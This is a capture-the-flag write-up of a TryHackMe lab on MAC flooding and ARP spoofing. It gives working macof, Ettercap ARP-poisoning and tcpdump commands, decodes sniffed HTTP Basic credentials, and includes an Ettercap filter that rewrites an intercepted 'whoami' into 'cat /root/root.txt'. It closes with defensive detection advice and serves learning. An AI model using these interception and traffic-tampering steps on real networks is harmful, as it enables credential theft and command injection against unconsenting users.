# TryHackMe -- L2: MAC Flooding & ARP Spoofing

**Date completed:** 10 November 2026\
**Platform:** TryHackMe\
**Room:** L2: MAC Flooding & ARP Spoofing\
**Primary focus:** Layer 2 networking, MAC flooding, ARP spoofing,
traffic sniffing, and packet manipulation\
**Lab attacker:** Eve (`192.168.12.66`)\
**Lab targets:** Alice (`192.168.12.10`) and Bob (`192.168.12.20`)

> **Scope note:** These notes document my work in the authorized
> TryHackMe lab. They are written from my observations and terminal
> output. The exact task instructions and results for Tasks 1 and 6 were
> not present in the notes available while preparing this document, so I
> have not invented their commands or answers.

------------------------------------------------------------------------

## 1. Room overview

In this room, I explored attacks that operate at Layer 2 of the OSI
model. The exercises introduced the relationship between Ethernet
switching, MAC address tables, ARP resolution, and traffic forwarding.

The room's practical focus was to understand how an attacker on the same
network can interfere with communication between two hosts. I used Eve
as the attacker machine, while Alice and Bob represented the
communicating systems.

The most important progression in the room was:

1.  Understand the lab network and identify the systems.
2.  Observe how MAC flooding can affect Ethernet switching.
3.  Position Eve between Alice and Bob using ARP spoofing.
4.  Capture traffic passing between the two systems.
5.  Inspect information exposed by unencrypted protocols.
6.  Move from passive interception to active packet manipulation with an
    Ettercap filter.

The key distinction I learned is that a Man-in-the-Middle (MITM)
position can be used for more than simply reading traffic. If the
protocol and traffic protections allow it, intercepted data may also be
modified before it reaches its destination.

## 2. Lab topology and addressing

The lab contained three important machines:

  Machine   IP address        Role
  --------- ----------------- --------------------------------
  Eve       `192.168.12.66`   Attacker machine
  Alice     `192.168.12.10`   Client / communicating host
  Bob       `192.168.12.20`   Server / remote shell endpoint

Eve had two network interfaces:

-   `eth0` was the management interface.
-   `eth1` was connected to the lab network (`192.168.12.0/24`).

The MAC addresses observed during the MITM exercise were:

  Machine        MAC address
  -------------- ---------------------
  Eve (`eth1`)   `F6:9C:2A:55:6F:3E`
  Alice          `76:DC:F4:E9:BE:12`
  Bob            `CE:F9:AF:CA:5A:C2`

I needed to use `eth1` for the lab traffic. Choosing the wrong interface
could result in capturing management traffic instead of the traffic
between Alice and Bob.

## 3. Initial access and interface identification

I connected to the attacker machine using SSH. The room supplied the
connection details.

``` bash
ssh admin@<EVE_MANAGEMENT_IP>
```

After connecting, I used the following command to inspect the network
interfaces:

``` bash
ip address
```

I identified the lab interface and checked its configuration:

``` bash
ip address show eth1
```

The lab interface had the address:

``` text
192.168.12.66/24
```

This confirmed that Eve was connected to the same `/24` lab network as
Alice and Bob.

### Why interface identification matters

A machine can have more than one network interface, each connected to a
different network. Packet capture and network attack tools need to use
the interface that can see the target traffic.

In this lab:

-   `eth0` was used for management access.
-   `eth1` was used for communication with Alice and Bob.

I therefore specified `-i eth1` in the relevant Ettercap and tcpdump
commands.

## 4. Task 3 -- Network discovery

Before attempting interception, I needed to identify which systems were
active on the lab subnet.

I used Nmap's ping scan:

``` bash
sudo nmap -sn -e eth1 192.168.12.0/24
```

### Breaking down the command

  Option / value      Meaning
  ------------------- ---------------------------------------------
  `sudo`              Runs the command with elevated privileges
  `nmap`              Network discovery and scanning tool
  `-sn`               Performs host discovery without a port scan
  `-e eth1`           Uses the specified network interface
  `192.168.12.0/24`   Scans the lab subnet

The important hosts identified were:

-   `192.168.12.10` -- Alice
-   `192.168.12.20` -- Bob
-   `192.168.12.66` -- Eve

### Why discovery comes first

Network discovery gives me an initial picture of the systems that are
reachable. It helps avoid guessing target addresses and provides the
information needed for later targeted scans and packet captures.

## 5. Task 4 -- Packet and protocol observations

During the early network analysis exercises, I examined packets and
their protocol fields.

One observation involved Bob sending ICMP Echo Requests to Eve. The
captured ICMP packet had a total ICMP length of 674 bytes.

An ICMP header is 8 bytes long. Therefore, the ICMP data section was:

``` text
674 - 8 = 666 bytes
```

The observed data size was:

``` text
666 bytes
```

### What this taught me

A packet is made up of protocol headers and data. When inspecting packet
lengths, I need to understand whether the displayed value includes the
header or refers only to the payload.

For this observation:

-   Total ICMP length: 674 bytes
-   ICMP header: 8 bytes
-   ICMP data: 666 bytes

## 6. Task 5 -- MAC flooding and traffic sniffing

This task introduced MAC flooding and the behavior of a switch's MAC
address table.

### 6.1 Understanding the MAC address table

An Ethernet switch learns which MAC addresses are reachable through its
ports. It stores these associations in a MAC address table, often called
a CAM table.

A simplified entry associates:

-   A learned MAC address
-   The switch port where that address was observed

When a frame arrives, the switch consults this table to decide where to
forward it.

### 6.2 What MAC flooding attempts to do

MAC flooding generates many Ethernet frames with different, often
randomized, source MAC addresses. The intention is to consume the
switch's available MAC address table capacity.

If a switch cannot maintain the expected entries, its forwarding
behavior may change. On vulnerable or poorly protected equipment, this
can result in unknown unicast traffic being flooded more broadly.

This does not mean every switch automatically becomes a hub. The actual
behavior depends on the switch implementation, available table capacity,
and defensive features.

### 6.3 Generating MAC address traffic

I used `macof` on the lab interface:

``` bash
sudo macof -i eth1
```

I also used Ettercap's `rand_flood` functionality during the exercise.

To capture packets for later analysis, I used:

``` bash
sudo tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap
```

### Command explanation

  Part                      Meaning
  ------------------------- ----------------------------------------------------------
  `tcpdump`                 Packet capture utility
  `-A`                      Prints packets in ASCII when displaying captured traffic
  `-i eth1`                 Captures on the lab interface
  `-w /tmp/tcpdump2.pcap`   Writes captured packets to a pcap file

When `-w` is used, tcpdump writes packet data to the file. The ASCII
option is primarily useful when displaying packets; it does not turn the
pcap file into a text log.

### 6.4 Observations

One recorded capture showed:

-   6,642 packets captured
-   6,630 unique source MAC addresses
-   6,629 ARP frames

The exercise also included an ICMP observation with a data section of
1,337 bytes.

### What I learned

MAC flooding targets the switching infrastructure rather than a
particular application service. It is therefore important to understand
Layer 2 behavior when investigating unusual network traffic.

Defensive controls can include switch port security, limits on learned
MAC addresses, monitoring for MAC address churn, and appropriate network
segmentation.

## 7. Task 7 -- Man-in-the-Middle: Sniffing

This was the first major MITM exercise. I used ARP poisoning to position
Eve between Alice and Bob and then inspected the communication passing
through Eve.

### 7.1 Identify the exposed services

I had already identified Alice and Bob. I then checked their services.

The observations were:

  Host                            Port Observation
  ------------------------- ---------- ----------------------------
  Alice (`192.168.12.10`)     TCP 4444 Remote shell communication
  Bob (`192.168.12.20`)         TCP 80 HTTP service

Bob's HTTP service could be tested with:

``` bash
curl -i http://192.168.12.20
```

The response included:

``` http
HTTP/1.0 401 Unauthorized
Server: SimpleHTTP/0.6 Python/2.7.12
WWW-Authenticate: Basic realm="Test"
```

The `401 Unauthorized` response indicated that authentication was
required. The `WWW-Authenticate` header showed that the server was
requesting HTTP Basic Authentication.

### 7.2 Understand ARP before poisoning

ARP stands for Address Resolution Protocol. On an IPv4 local network, a
host uses ARP to discover the MAC address associated with an IP address.

For example, Alice needs Bob's MAC address before sending an Ethernet
frame to Bob on the local network.

ARP does not provide built-in authentication for replies. A host may
accept an unsolicited or forged ARP reply and update its ARP cache.

This weakness is what makes ARP spoofing possible.

### 7.3 Start ARP poisoning with Ettercap

I used the following command:

``` bash
sudo ettercap -T -i eth1 -M arp:remote /192.168.12.10// /192.168.12.20//
```

### Breaking down the command

  Argument             Meaning
  -------------------- ----------------------------------------
  `sudo`               Runs Ettercap with elevated privileges
  `ettercap`           Network interception and analysis tool
  `-T`                 Uses text-only mode
  `-i eth1`            Uses the lab network interface
  `-M arp:remote`      Starts ARP poisoning in remote mode
  `/192.168.12.10//`   Specifies Alice as one target
  `/192.168.12.20//`   Specifies Bob as the other target

Ettercap identified two hosts and displayed them as poisoning victims:

``` text
GROUP 1 : 192.168.12.10 76:DC:F4:E9:BE:12
GROUP 2 : 192.168.12.20 CE:F9:AF:CA:5A:C2
```

It then displayed:

``` text
Starting Unified sniffing...
```

This indicated that the interception session had started.

### 7.4 Understand what happened to the ARP mappings

During the attack, Eve sent forged ARP information to Alice and Bob.

The intended effect was that:

-   Alice associated Bob's IP address with Eve's MAC address.
-   Bob associated Alice's IP address with Eve's MAC address.

As a result, traffic between Alice and Bob could pass through Eve.

Eve could then inspect the intercepted packets.

### 7.5 Capture traffic independently with tcpdump

I opened a second terminal and ran:

``` bash
sudo tcpdump -i eth1 -nn -A 'host 192.168.12.10 and host 192.168.12.20'
```

### Explanation

  -----------------------------------------------------------------------
  Option                              Meaning
  ----------------------------------- -----------------------------------
  `-i eth1`                           Capture on the lab interface

  `-nn`                               Do not resolve IP addresses or port
                                      numbers into names

  `-A`                                Display packet payloads as ASCII
                                      where possible

  `host A and host B`                 Restrict capture to traffic
                                      involving both specified hosts
  -----------------------------------------------------------------------

This gave me another view of the communication and helped confirm the
ARP poisoning behavior.

### 7.6 Identify the ARP spoofing evidence

The capture showed ARP announcements associating both Alice's and Bob's
IP addresses with Eve's MAC address:

``` text
192.168.12.10 -> F6:9C:2A:55:6F:3E
192.168.12.20 -> F6:9C:2A:55:6F:3E
```

The important observation was that two different IP addresses were being
associated with the same attacker MAC address.

This was evidence of Eve's MITM position.

### 7.7 Intercept HTTP Basic Authentication

During the capture, Alice sent an HTTP request to Bob:

``` http
GET /test.txt HTTP/1.1
Host: www.server.bob
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=
```

The Authorization header contained a Base64-encoded value.

The captured value was:

``` text
YWRtaW46czNjcjN0X1A0eno=
```

I decoded the value and obtained:

``` text
admin:s3cr3t_P4zz
```

Ettercap also identified the credentials in its parsed HTTP output:

``` text
HTTP : 192.168.12.20:80
USER: admin
PASS: s3cr3t_P4zz
INFO: www.server.bob/test.txt
```

### Why this was possible

HTTP Basic Authentication does not encrypt the username and password. It
encodes the credential string using Base64.

Base64 is reversible encoding, not encryption. Anyone who can capture
the unprotected HTTP request can decode the credentials.

HTTPS protects the HTTP communication using TLS, helping prevent an
intermediary from reading or modifying the application data.

### 7.8 Observe the communication on TCP port 4444

Ettercap also captured communication between Alice and Bob on TCP port
4444.

Alice sent commands:

``` text
whoami
pwd
ls
```

Bob returned:

``` text
root
/root
rev.go
root.txt
server.sh
www
```

The observations showed:

  Command from Alice   Response from Bob
  -------------------- ------------------------------------------
  `whoami`             `root`
  `pwd`                `/root`
  `ls`                 `rev.go`, `root.txt`, `server.sh`, `www`

This was an interactive remote shell channel. The captured exchange
showed that Alice could issue commands and receive their output from
Bob.

### 7.9 Test the captured credentials

After observing the credentials, I tested whether they worked against
Bob's HTTP service:

``` bash
curl -i -u 'admin:s3cr3t_P4zz' http://192.168.12.20/test.txt
```

The server returned:

``` http
HTTP/1.0 200 OK
```

The response body was:

``` text
OK
```

This confirmed that the captured credentials were valid for the HTTP
service.

### 7.10 Retrieve the user flag

I requested the directory listing:

``` bash
curl -u admin:s3cr3t_P4zz http://192.168.12.20/
```

The listing contained:

``` text
SimpleHTTPAuthServer.py
test.txt
user.txt
```

I downloaded the user flag:

``` bash
curl -u admin:s3cr3t_P4zz http://192.168.12.20/user.txt -o /tmp/user.txt
```

Then I read it:

``` bash
cat /tmp/user.txt
```

The user flag was:

``` text
THM{wh0s_$n!ff1ng_0ur_cr3ds}
```

### 7.11 Observe ARP restoration

When I stopped the Ettercap session, I observed corrective ARP traffic
in tcpdump.

The original IP-to-MAC mappings were advertised again:

  Host                      Restored MAC address
  ------------------------- ----------------------
  Alice (`192.168.12.10`)   `76:DC:F4:E9:BE:12`
  Bob (`192.168.12.20`)     `CE:F9:AF:CA:5A:C2`

This is important because an ARP poisoning session can leave incorrect
ARP cache entries behind if the mappings are not restored or refreshed.

The tool's cleanup behavior helped return the lab hosts to their
original mappings.

## 8. Task 8 -- Man-in-the-Middle: Manipulation

Task 8 took the previous MITM exercise further.

In Task 7, I intercepted traffic and read the information travelling
between Alice and Bob. In this task, I modified the intercepted
communication.

The room's objective was to manipulate Alice's `whoami` command before
Bob received it.

I used an Ettercap filter to identify the relevant TCP packet, search
its payload, and replace the command.

### 8.1 Understand the filter workflow

Ettercap filters use two file formats in this exercise:

  File extension   Purpose
  ---------------- ------------------------------------
  `.ecf`           Human-readable filter source
  `.ef`            Compiled filter loaded by Ettercap

The workflow was:

1.  Write the filter source.
2.  Compile the source with `etterfilter`.
3.  Load the compiled filter into Ettercap.
4.  Start ARP poisoning between Alice and Bob.
5.  Wait for a matching packet.
6.  Observe the modified command and Bob's response.

### 8.2 Create the filter source

I created `whoami.ecf`:

``` bash
cat > whoami.ecf <<'EOF'
if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "cat /root/root.txt");
    msg("###### ETTERFILTER: replaced whoami with root flag command. ######\n");
}
EOF
```

### 8.3 Understand each filter condition

The first part checked the protocol:

``` c
ip.proto == TCP
```

This limited the filter to TCP packets.

The next condition checked the source port:

``` c
tcp.src == 4444
```

In the previous task, I had observed Alice's remote shell communication
using source port 4444.

The filter then searched the packet data:

``` c
search(DATA.data, "whoami")
```

This checked whether the packet payload contained the text `whoami`.

The three conditions were joined using `&&`, meaning all of them had to
match.

### 8.4 Understand the filter actions

The logging instruction was:

``` c
log(DATA.data, "/root/ettercap.log");
```

It attempted to write the matched packet data to a log file.

The replacement instruction was:

``` c
replace("whoami", "cat /root/root.txt");
```

This changed the command in the matching packet.

The message instruction was:

``` c
msg("###### ETTERFILTER: replaced whoami with root flag command. ######\n");
```

This printed a message in Ettercap's text interface when the filter
matched.

### 8.5 Compile the filter

I compiled the source file:

``` bash
etterfilter whoami.ecf -o whoami.ef
```

I checked that both files existed:

``` bash
ls -l whoami.ecf whoami.ef
```

My terminal confirmed that the source and compiled files were present:

``` text
-rw-rw-r-- 1 admin admin 244 Nov 10 16:36 whoami.ecf
-rw-r--r-- 1 admin admin 704 Nov 10 16:36 whoami.ef
```

This confirmed that the compiled filter file had been generated.

### 8.6 Start Ettercap with the compiled filter

I started the MITM session and loaded the filter:

``` bash
sudo ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef
```

The output confirmed:

``` text
Content filters loaded from whoami.ef...
```

Ettercap then identified Alice and Bob as the two poisoning victims and
started unified sniffing.

### 8.7 Observe the manipulation

Ettercap captured Alice sending:

``` text
whoami
```

The filter printed its message:

``` text
###### ETTERFILTER: replaced whoami with root flag command. ######
```

The modified command was:

``` bash
cat /root/root.txt
```

Bob's response contained:

``` text
THM{wh4t_an_ev1l_M!tM_u_R}
```

This confirmed that the packet manipulation worked in the lab.

### 8.8 Root flag

The root flag was:

``` text
THM{wh4t_an_ev1l_M!tM_u_R}
```

### 8.9 Investigate the log-file error

During the exercise, Ettercap printed:

``` text
filter engine: Cannot open file /root/ettercap.log
```

I also observed:

``` text
Privileges dropped to EUID 65534 EGID 65534...
```

Ettercap had dropped its privileges after initialization. The process no
longer had the permissions needed to create a file inside `/root`.

This caused the logging operation to fail.

However, the filter's replacement operation still worked. The terminal
displayed the filter message, and Bob returned the root flag.

A writable path such as `/tmp/ettercap.log` would be more appropriate
for the logging instruction in this environment.

## 9. Flags collected

  Task                  Flag
  --------------------- --------------------------------
  Task 7 -- User flag   `THM{wh0s_$n!ff1ng_0ur_cr3ds}`
  Task 8 -- Root flag   `THM{wh4t_an_ev1l_M!tM_u_R}`

## 10. Tools and commands reference

  Tool            How I used it
  --------------- --------------------------------------------------------
  SSH             Connected to Eve
  `ip`            Inspected network interfaces and addresses
  Nmap            Discovered active hosts and identified services
  `macof`         Generated frames with randomized source MAC addresses
  tcpdump         Captured and inspected network traffic
  Ettercap        Performed ARP poisoning and MITM sniffing
  `etterfilter`   Compiled the custom packet filter
  curl            Tested HTTP authentication and retrieved the user flag

### Important commands from the room

Host discovery:

``` bash
sudo nmap -sn -e eth1 192.168.12.0/24
```

MAC flooding:

``` bash
sudo macof -i eth1
```

Packet capture:

``` bash
sudo tcpdump -i eth1 -nn -A 'host 192.168.12.10 and host 192.168.12.20'
```

ARP poisoning and sniffing:

``` bash
sudo ettercap -T -i eth1 -M arp:remote /192.168.12.10// /192.168.12.20//
```

HTTP authentication test:

``` bash
curl -i -u 'admin:s3cr3t_P4zz' http://192.168.12.20/test.txt
```

Filter compilation:

``` bash
etterfilter whoami.ecf -o whoami.ef
```

MITM with the compiled filter:

``` bash
sudo ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef
```

## 11. SOC and Blue Team lessons

Although this room focused on offensive techniques, I can connect the
observations to defensive monitoring.

### 11.1 Detect ARP spoofing

Potential indicators include:

-   One MAC address claiming multiple IP addresses unexpectedly.
-   Frequent changes in IP-to-MAC mappings.
-   Unsolicited or suspicious ARP replies.
-   Duplicate IP address warnings.

Defensive measures include Dynamic ARP Inspection where supported, DHCP
snooping, static ARP entries for selected critical systems, and network
segmentation.

### 11.2 Detect MAC flooding

Potential indicators include:

-   Unusually high MAC address learning rates.
-   Many new source MAC addresses appearing on one switch port.
-   MAC address table exhaustion or churn.
-   Unexpected increases in flooded or unknown-unicast traffic.

Defensive measures include switch port security, MAC address limits,
storm control where appropriate, and monitoring switch logs.

### 11.3 Protect credentials

The HTTP Basic Authentication exercise demonstrated the risk of sending
credentials over plain HTTP.

Defensive measures include:

-   Enforcing HTTPS.
-   Redirecting or blocking unencrypted HTTP where appropriate.
-   Using secure authentication mechanisms.
-   Avoiding credential reuse.
-   Monitoring for unexpected cleartext authentication traffic.

### 11.4 Monitor suspicious remote shell activity

The TCP port 4444 communication showed command execution and command
output travelling between systems.

For a SOC analyst, useful investigation sources include:

-   Endpoint process creation logs.
-   Parent-child process relationships.
-   Network connection telemetry.
-   Firewall logs.
-   IDS/IPS alerts.
-   Unusual listening or connected ports.
-   Unexpected shell processes and command interpreters.

A port number alone is not enough to determine whether traffic is
malicious. It needs to be correlated with the communicating hosts,
process activity, timing, and other evidence.

### 11.5 Understand the importance of encryption

The room showed how an attacker may read and modify traffic when
communication is not adequately protected.

Encryption with authenticated integrity protection helps prevent an
intermediary from reading or silently modifying application data.

HTTPS and properly configured TLS are important protections for web
communication. Secure network design should also consider endpoint
authentication, segmentation, and monitoring.

## 12. What I learned

By completing this room, I gained practical experience with:

-   Identifying hosts on a local network.
-   Understanding Ethernet MAC address learning.
-   Understanding the purpose and limitations of ARP.
-   Observing the effects of MAC flooding.
-   Performing ARP spoofing in a controlled lab.
-   Positioning an attacker between two communicating hosts.
-   Capturing HTTP traffic and identifying exposed credentials.
-   Understanding why Base64 is not encryption.
-   Inspecting remote shell traffic.
-   Writing and compiling an Ettercap filter.
-   Matching packets by protocol, port, and payload.
-   Modifying intercepted command data.
-   Recognizing the difference between passive sniffing and active
    manipulation.

## 13. Final reflection

This room helped me understand that network attacks do not always begin
with exploiting an application or compromising an operating system.
Weaknesses in local network protocols and switching behavior can also
expose communication between systems.

The most valuable part of the room was seeing the difference between the
two MITM stages.

In Task 7, I used ARP poisoning to intercept traffic between Alice and
Bob. I observed HTTP Basic Authentication credentials and inspected
their remote shell communication.

In Task 8, I used an Ettercap filter to modify a command in transit.
Instead of simply reading Alice's `whoami` command, I replaced it with
another command and observed Bob's response containing the root flag.

This gave me a much clearer understanding of how passive interception
and active packet manipulation differ.

From a defensive perspective, I learned why ARP monitoring, switch
security, encrypted communication, endpoint telemetry, and network
traffic analysis are all important parts of protecting an environment.

